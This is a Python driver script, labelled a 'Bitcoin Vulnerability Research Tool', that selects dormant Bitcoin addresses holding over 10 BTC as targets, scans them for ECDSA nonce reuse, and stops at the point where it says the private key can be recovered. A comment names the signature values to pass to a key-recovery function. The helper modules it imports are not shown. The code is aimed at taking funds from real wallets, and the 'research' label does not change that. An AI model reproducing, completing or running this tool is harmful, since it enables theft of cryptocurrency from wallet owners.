import hunter
import scanner
import recover_key
import sys

def main():
    print("--- Bitcoin Vulnerability Research Tool ---")
    print("Objective: Identifying dormant high-value targets and scanning for nonce reuse.")
    
    # 1. Get targets
    targets = hunter.get_dormant_targets(min_balance_btc=10.0) # Search for addresses with >10 BTC
    
    if not targets:
        print("No targets found.")
        return

    print(f"\nScanning {len(targets)} high-value dormant addresses for vulnerabilities...")
    
    for t in targets:
        address = t['address']
        balance = t['balance']
        
        # 2. Scan each address
        reuse_found = scanner.scan_address_for_nonce_reuse(address)
        
        if reuse_found:
            print(f"!!! CRITICAL VULNERABILITY FOUND at {address} !!!")
            print("Mathematical recovery of private key is now possible.")
            # At this point, a researcher would extract r, s1, z1, s2, z2 
            # and pass them to recover_key.recover_private_key()
            break
        else:
            print(f"Address {address} (Balance: {balance} BTC) appears secure from nonce reuse.")

if __name__ == "__main__":
    main()
